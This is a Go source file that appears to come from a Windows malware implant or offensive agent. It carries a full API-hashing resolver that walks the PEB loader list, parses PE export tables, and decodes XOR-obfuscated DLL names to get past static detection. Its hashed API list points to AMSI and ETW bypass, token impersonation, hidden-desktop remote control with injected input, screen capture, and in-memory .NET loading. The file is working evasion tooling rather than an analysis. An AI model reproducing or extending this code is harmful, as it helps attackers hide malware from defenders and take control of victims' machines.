//go:build windows

package main

import (
	"sync"
	"sync/atomic"
	"syscall"
	"unsafe"
)

var fwdDepth int32

func getPEB() uintptr

const (
	mKernel32 uint32 = 0xA3E6F6C3
	mNtdll    uint32 = 0xA62A3B3B
	mAdvapi32 uint32 = 0x39794115
	mUser32   uint32 = 0xC0323159
	mGdi32    uint32 = 0x8B4D9112
	mWtsapi32 uint32 = 0x0EDE916A
	mAmsi     uint32 = 0x0187B681
	mMscoree  uint32 = 0x51D79D77
	mOleaut32 uint32 = 0x733D6D1E
)

const (
	fVirtualProtect                       uint32 = 0x820621F3
	fGetModuleHandleW                     uint32 = 0xD263BDE6
	fGetProcAddress                       uint32 = 0xF8F45725
	fCreateFileW                          uint32 = 0xAFCAB3C4
	fCreateFileMappingW                   uint32 = 0xFFB22378
	fMapViewOfFile                        uint32 = 0x3D05404B
	fUnmapViewOfFile                      uint32 = 0xCCBE6786
	fCloseHandle                          uint32 = 0xFABA0065
	fOpenProcess                          uint32 = 0x4105FC56
	fCreateProcessW                       uint32 = 0x3C7BF3FF
	fInitializeProcThreadAttributeList    uint32 = 0xA780261D
	fUpdateProcThreadAttribute            uint32 = 0xF150D85C
	fDeleteProcThreadAttributeList        uint32 = 0xBBB2B13A
	fGetCurrentThread                     uint32 = 0x9BC5A608
	fAddVectoredExceptionHandler          uint32 = 0xAFAC650D
	fNtProtectVirtualMemory               uint32 = 0xBD799926
	fNtGetContextThread                   uint32 = 0x65ECAF30
	fNtSetContextThread                   uint32 = 0xEA61D9E4
	fRegOpenKeyExW                        uint32 = 0xFBF688C6
	fRegSetValueExW                       uint32 = 0xC850F786
	fRegDeleteValueW                      uint32 = 0xFEC9455C
	fRegCloseKey                          uint32 = 0x1242154A
	fGetDC                                uint32 = 0xC84FA23E
	fReleaseDC                            uint32 = 0x294AFF17
	fGetSystemMetrics                     uint32 = 0xB0327E93
	fCreateCompatibleDC                   uint32 = 0xD1420ADA
	fCreateCompatibleBitmap               uint32 = 0xB9D36FF0
	fSelectObject                         uint32 = 0x8D74F842
	fBitBlt                               uint32 = 0x2A7904CE
	fGetDIBits                            uint32 = 0xE713C7A8
	fDeleteObject                         uint32 = 0xFCAAA581
	fDeleteDC                             uint32 = 0xBA44928B
	fLoadLibraryW                         uint32 = 0x41B1EAB9
	fVirtualAlloc                         uint32 = 0x03285501
	fVirtualFree                          uint32 = 0x3A9ACC72
	fVirtualQuery                         uint32 = 0xBE4D5EF8
	fSleepEx                              uint32 = 0x9C6BE9BD
	fCreateThread                         uint32 = 0x60AC7E39
	fWaitForSingleObject                  uint32 = 0x71948CA4
	fOpenProcessToken                     uint32 = 0x5E5AD0C3
	fDuplicateTokenEx                     uint32 = 0x0846671E
	fImpersonateLoggedOnUser              uint32 = 0x4AF775EA
	fRevertToSelf                         uint32 = 0x444F7688
	fLogonUserW                           uint32 = 0xDD5FF658
	fGetTokenInformation                  uint32 = 0x035F513A
	fLookupAccountSidW                    uint32 = 0x4307EFB7
	fCreateDesktopW                       uint32 = 0x9E59B184
	fOpenDesktopW                         uint32 = 0xABE49C98
	fSetThreadDesktop                     uint32 = 0x9C3725A9
	fCloseDesktop                         uint32 = 0x5618AD11
	fKeybdEvent                           uint32 = 0x11DC8E6D
	fMouseEvent                           uint32 = 0x20785C9B
	fVkKeyScanW                           uint32 = 0x75C0F1C5
	fStretchBlt                           uint32 = 0xBED5E838
	fRegisterClassW                       uint32 = 0xE127AE1D
	fCreateWindowExW                      uint32 = 0x2D727B8D
	fDefWindowProcW                       uint32 = 0x4516D3AD
	fShowWindow                           uint32 = 0xC98B9E00
	fEnumWindows                          uint32 = 0x6D15BBBD
	fPrintWindow                          uint32 = 0x3EA224B4
	fGetWindowDC                          uint32 = 0x4FD71B4E
	fGetWindowRect                        uint32 = 0x1A4F5149
	fIsWindowVisible                      uint32 = 0xAD81ADA9
	fIsIconic                             uint32 = 0xA56569F8
	fGetDesktopWindow                     uint32 = 0xB26629A5
	fFillRect                             uint32 = 0x3A6956C6
	fCreateSolidBrush                     uint32 = 0xCC62A0BC
	fPostMessageW                         uint32 = 0xFD6577E3
	fGetClassNameA                        uint32 = 0xB27BDDC9
	fGetUserNameW                         uint32 = 0x22A7A378
	fWTSQueryUserToken                    uint32 = 0xD6F6D477
	fCreateProcessAsUserA                 uint32 = 0x8C9A9C00
	fProcessIdToSessionId                 uint32 = 0x83E20C1B
	fWTSGetActiveConsoleSessionId         uint32 = 0x826B0FD1
	fGetStdHandle                         uint32 = 0xE3B9876A
	fPeekNamedPipe                        uint32 = 0x313FF717
	fReadFile                             uint32 = 0x54FCC943
	fWriteFile                            uint32 = 0x7F07C44A
	fGetVolumeInformationA                uint32 = 0xC6DD0460
	fCreateProcessA                       uint32 = 0x4A7C0A09
	fCLRCreateInstance                    uint32 = 0xC5688927
	fSafeArrayCreate                      uint32 = 0x07536A8D
	fSafeArrayPutElement                  uint32 = 0xDA03D4D6
	fSafeArrayAccessData                  uint32 = 0xA2AE57E3
	fSafeArrayUnaccessData                uint32 = 0x5C92C994
	fSysAllocString                       uint32 = 0xC8A39AC2
	fEtwEventWrite                        uint32 = 0xE5F4BDDE
	fEtwEventWriteEx                      uint32 = 0xE8F45F7B
	fAmsiScanBuffer                       uint32 = 0xF76951A4
)

var (
	resolverOnce sync.Once
	modCache     map[uint32]uintptr
	procCacheMu  sync.RWMutex
	procCache    map[uint64]uintptr
)

func initResolver() {
	resolverOnce.Do(func() {
		modCache = make(map[uint32]uintptr)
		procCache = make(map[uint64]uintptr)
		walkPEB()
	})
}

func walkPEB() {
	peb := getPEB()
	if peb == 0 {
		return
	}

	ldr := *(*uintptr)(unsafe.Pointer(peb + 0x18))
	if ldr == 0 {
		return
	}

	head := ldr + 0x20
	headFlink := *(*uintptr)(unsafe.Pointer(head))
	cur := headFlink

	for cur != head {
		entry := cur - 0x10
		dllBase := *(*uintptr)(unsafe.Pointer(entry + 0x30))
		nameLen := *(*uint16)(unsafe.Pointer(entry + 0x58))
		nameBuf := *(*uintptr)(unsafe.Pointer(entry + 0x60))

		if nameLen > 0 && nameBuf != 0 && dllBase != 0 {
			n := int(nameLen / 2)
			chars := unsafe.Slice((*uint16)(unsafe.Pointer(nameBuf)), n)
			h := hashU16CI(chars)
			modCache[h] = dllBase
		}

		cur = *(*uintptr)(unsafe.Pointer(cur))
	}
}

func hashU16CI(chars []uint16) uint32 {
	h := uint32(0x811C9DC5)
	for _, ch := range chars {
		c := byte(ch & 0xFF)
		if c == 0 {
			break
		}
		if c >= 'A' && c <= 'Z' {
			c += 32
		}
		h ^= uint32(c)
		h *= 0x01000193
	}
	return h
}

func hashBytesCS(data []byte) uint32 {
	h := uint32(0x811C9DC5)
	for _, b := range data {
		if b == 0 {
			break
		}
		h ^= uint32(b)
		h *= 0x01000193
	}
	return h
}

func findMod(nameHash uint32) uintptr {
	initResolver()
	return modCache[nameHash]
}

func findModPath(nameHash uint32) string {
	initResolver()
	peb := getPEB()
	if peb == 0 {
		return ""
	}
	ldr := *(*uintptr)(unsafe.Pointer(peb + 0x18))
	if ldr == 0 {
		return ""
	}
	head := ldr + 0x20
	cur := *(*uintptr)(unsafe.Pointer(head))
	for cur != head {
		entry := cur - 0x10
		nameLen := *(*uint16)(unsafe.Pointer(entry + 0x58))
		nameBuf := *(*uintptr)(unsafe.Pointer(entry + 0x60))
		if nameLen > 0 && nameBuf != 0 {
			n := int(nameLen / 2)
			chars := unsafe.Slice((*uint16)(unsafe.Pointer(nameBuf)), n)
			if hashU16CI(chars) == nameHash {
				fullLen := *(*uint16)(unsafe.Pointer(entry + 0x48))
				fullBuf := *(*uintptr)(unsafe.Pointer(entry + 0x50))
				if fullLen > 0 && fullBuf != 0 {
					fn := int(fullLen / 2)
					fullChars := unsafe.Slice((*uint16)(unsafe.Pointer(fullBuf)), fn)
					return syscall.UTF16ToString(fullChars)
				}
			}
		}
		cur = *(*uintptr)(unsafe.Pointer(cur))
	}
	return ""
}

func hashNameCI(name string) uint32 {
	h := uint32(0x811C9DC5)
	for i := 0; i < len(name); i++ {
		c := name[i]
		if c >= 'A' && c <= 'Z' {
			c += 32
		}
		h ^= uint32(c)
		h *= 0x01000193
	}
	return h
}

func loadModByName(name string) uintptr {
	initResolver()
	h := hashNameCI(name)
	if base := modCache[h]; base != 0 {
		return base
	}
	k32 := findMod(mKernel32)
	if k32 == 0 {
		return 0
	}
	loadLib := findExportNoFwd(k32, fLoadLibraryW)
	if loadLib == 0 {
		return 0
	}
	nameW, _ := syscall.UTF16PtrFromString(name)
	r, _, _ := syscall.SyscallN(loadLib, uintptr(unsafe.Pointer(nameW)))
	if r != 0 {
		modCache[h] = r
	}
	return r
}

func findExportNoFwd(base uintptr, funcHash uint32) uintptr {
	if base == 0 {
		return 0
	}
	magic := *(*uint16)(unsafe.Pointer(base))
	if magic != 0x5A4D {
		return 0
	}
	lfanew := *(*int32)(unsafe.Pointer(base + 0x3C))
	ntHdr := base + uintptr(lfanew)
	sig := *(*uint32)(unsafe.Pointer(ntHdr))
	if sig != 0x00004550 {
		return 0
	}
	optHdr := ntHdr + 24
	optMagic := *(*uint16)(unsafe.Pointer(optHdr))
	var exportRVA uint32
	switch optMagic {
	case 0x20B:
		exportRVA = *(*uint32)(unsafe.Pointer(optHdr + 112))
	case 0x10B:
		exportRVA = *(*uint32)(unsafe.Pointer(optHdr + 96))
	default:
		return 0
	}
	if exportRVA == 0 {
		return 0
	}
	expDir := base + uintptr(exportRVA)
	numNames := *(*uint32)(unsafe.Pointer(expDir + 24))
	addrFuncs := base + uintptr(*(*uint32)(unsafe.Pointer(expDir + 28)))
	addrNames := base + uintptr(*(*uint32)(unsafe.Pointer(expDir + 32)))
	addrOrds := base + uintptr(*(*uint32)(unsafe.Pointer(expDir + 36)))
	for i := uint32(0); i < numNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(addrNames + uintptr(i)*4))
		namePtr := base + uintptr(nameRVA)
		nameBytes := unsafe.Slice((*byte)(unsafe.Pointer(namePtr)), 128)
		h := hashBytesCS(nameBytes)
		if h == funcHash {
			ord := *(*uint16)(unsafe.Pointer(addrOrds + uintptr(i)*2))
			fRVA := *(*uint32)(unsafe.Pointer(addrFuncs + uintptr(ord)*4))
			return base + uintptr(fRVA)
		}
	}
	return 0
}

func findExportByHash(base uintptr, funcHash uint32) uintptr {
	if base == 0 {
		return 0
	}

	magic := *(*uint16)(unsafe.Pointer(base))
	if magic != 0x5A4D {
		return 0
	}

	lfanew := *(*int32)(unsafe.Pointer(base + 0x3C))
	ntHdr := base + uintptr(lfanew)

	sig := *(*uint32)(unsafe.Pointer(ntHdr))
	if sig != 0x00004550 {
		return 0
	}

	optHdr := ntHdr + 24
	optMagic := *(*uint16)(unsafe.Pointer(optHdr))

	var exportRVA, exportSize uint32
	switch optMagic {
	case 0x20B:
		exportRVA = *(*uint32)(unsafe.Pointer(optHdr + 112))
		exportSize = *(*uint32)(unsafe.Pointer(optHdr + 116))
	case 0x10B:
		exportRVA = *(*uint32)(unsafe.Pointer(optHdr + 96))
		exportSize = *(*uint32)(unsafe.Pointer(optHdr + 100))
	default:
		return 0
	}

	if exportRVA == 0 {
		return 0
	}

	expDir := base + uintptr(exportRVA)
	numNames := *(*uint32)(unsafe.Pointer(expDir + 24))
	addrFuncs := base + uintptr(*(*uint32)(unsafe.Pointer(expDir + 28)))
	addrNames := base + uintptr(*(*uint32)(unsafe.Pointer(expDir + 32)))
	addrOrds := base + uintptr(*(*uint32)(unsafe.Pointer(expDir + 36)))

	for i := uint32(0); i < numNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(addrNames + uintptr(i)*4))
		namePtr := base + uintptr(nameRVA)

		nameBytes := unsafe.Slice((*byte)(unsafe.Pointer(namePtr)), 128)
		h := hashBytesCS(nameBytes)

		if h == funcHash {
			ord := *(*uint16)(unsafe.Pointer(addrOrds + uintptr(i)*2))
			fRVA := *(*uint32)(unsafe.Pointer(addrFuncs + uintptr(ord)*4))
			if fRVA >= exportRVA && fRVA < exportRVA+exportSize {
				return resolveForwarder(base + uintptr(fRVA))
			}
			return base + uintptr(fRVA)
		}
	}

	return 0
}

func resolveForwarder(addr uintptr) uintptr {
	depth := atomic.AddInt32(&fwdDepth, 1)
	defer atomic.AddInt32(&fwdDepth, -1)
	if depth > 3 {
		return 0
	}
	fwd := unsafe.Slice((*byte)(unsafe.Pointer(addr)), 256)
	var s string
	for i, b := range fwd {
		if b == 0 {
			s = string(fwd[:i])
			break
		}
	}
	if s == "" {
		return 0
	}
	dot := -1
	for i := 0; i < len(s); i++ {
		if s[i] == '.' {
			dot = i
			break
		}
	}
	if dot < 0 {
		return 0
	}
	modName := s[:dot] + ".dll"
	funcName := s[dot+1:]
	mod := loadModByName(modName)
	if mod == 0 {
		return 0
	}
	fh := hashBytesCS([]byte(funcName))
	result := findExportByHash(mod, fh)
	if result == 0 {
		gpa := rpGetProcAddress
		if gpa == 0 {
			gpa = findExportNoFwd(findMod(mKernel32), fGetProcAddress)
		}
		if gpa != 0 {
			nameA := append([]byte(funcName), 0)
			result, _, _ = syscall.SyscallN(gpa, mod, uintptr(unsafe.Pointer(&nameA[0])))
		}
	}
	return result
}

func getProc(modHash, funcHash uint32) uintptr {
	key := uint64(modHash)<<32 | uint64(funcHash)

	procCacheMu.RLock()
	if addr, ok := procCache[key]; ok {
		procCacheMu.RUnlock()
		return addr
	}
	procCacheMu.RUnlock()

	base := findMod(modHash)
	if base == 0 {
		base = loadMod(modHash)
		if base == 0 {
			return 0
		}
	}

	addr := findExportByHash(base, funcHash)

	procCacheMu.Lock()
	procCache[key] = addr
	procCacheMu.Unlock()

	return addr
}

func loadMod(nameHash uint32) uintptr {
	k32 := findMod(mKernel32)
	if k32 == 0 {
		return 0
	}

	loadLib := findExportByHash(k32, fLoadLibraryW)
	if loadLib == 0 {
		return 0
	}

	var enc []byte
	switch nameHash {
	case mAdvapi32:
		enc = []byte{0x56, 0x53, 0x41, 0x56, 0x47, 0x5E, 0x04, 0x05, 0x19, 0x53, 0x5B, 0x5B}
	case mUser32:
		enc = []byte{0x42, 0x44, 0x52, 0x45, 0x04, 0x05, 0x19, 0x53, 0x5B, 0x5B}
	case mGdi32:
		enc = []byte{0x50, 0x53, 0x5E, 0x04, 0x05, 0x19, 0x53, 0x5B, 0x5B}
	case mWtsapi32:
		enc = []byte{0x40, 0x43, 0x44, 0x56, 0x47, 0x5E, 0x04, 0x05, 0x19, 0x53, 0x5B, 0x5B}
	case mMscoree:
		enc = []byte{0x5A, 0x44, 0x54, 0x58, 0x45, 0x52, 0x52, 0x19, 0x53, 0x5B, 0x5B}
	case mOleaut32:
		enc = []byte{0x58, 0x5B, 0x52, 0x56, 0x42, 0x43, 0x04, 0x05, 0x19, 0x53, 0x5B, 0x5B}
	case mAmsi:
		enc = []byte{0x56, 0x5A, 0x44, 0x5E, 0x19, 0x53, 0x5B, 0x5B}
	default:
		return 0
	}

	name := make([]byte, len(enc))
	for i, b := range enc {
		name[i] = b ^ 0x37
	}

	nameW, _ := syscall.UTF16PtrFromString(string(name))
	r, _, _ := syscall.SyscallN(loadLib, uintptr(unsafe.Pointer(nameW)))
	if r != 0 {
		modCache[nameHash] = r
	}
	return r
}

var (
	rpVirtualProtect                    uintptr
	rpGetModuleHandleW                  uintptr
	rpGetProcAddress                    uintptr
	rpCreateFileW                       uintptr
	rpCreateFileMappingW                uintptr
	rpMapViewOfFile                     uintptr
	rpUnmapViewOfFile                   uintptr
	rpCloseHandle                       uintptr
	rpOpenProcess                       uintptr
	rpCreateProcessW                    uintptr
	rpInitializeProcThreadAttributeList uintptr
	rpUpdateProcThreadAttribute         uintptr
	rpDeleteProcThreadAttributeList     uintptr
	rpNtProtectVirtualMemory            uintptr
)

func initResolvedProcs() {
	initResolver()
	rpVirtualProtect = getProc(mKernel32, fVirtualProtect)
	rpGetModuleHandleW = getProc(mKernel32, fGetModuleHandleW)
	rpGetProcAddress = getProc(mKernel32, fGetProcAddress)
	rpCreateFileW = getProc(mKernel32, fCreateFileW)
	rpCreateFileMappingW = getProc(mKernel32, fCreateFileMappingW)
	rpMapViewOfFile = getProc(mKernel32, fMapViewOfFile)
	rpUnmapViewOfFile = getProc(mKernel32, fUnmapViewOfFile)
	rpCloseHandle = getProc(mKernel32, fCloseHandle)
	rpOpenProcess = getProc(mKernel32, fOpenProcess)
	rpCreateProcessW = getProc(mKernel32, fCreateProcessW)
	rpInitializeProcThreadAttributeList = getProc(mKernel32, fInitializeProcThreadAttributeList)
	rpUpdateProcThreadAttribute = getProc(mKernel32, fUpdateProcThreadAttribute)
	rpDeleteProcThreadAttributeList = getProc(mKernel32, fDeleteProcThreadAttributeList)
	rpNtProtectVirtualMemory = getProc(mNtdll, fNtProtectVirtualMemory)
}
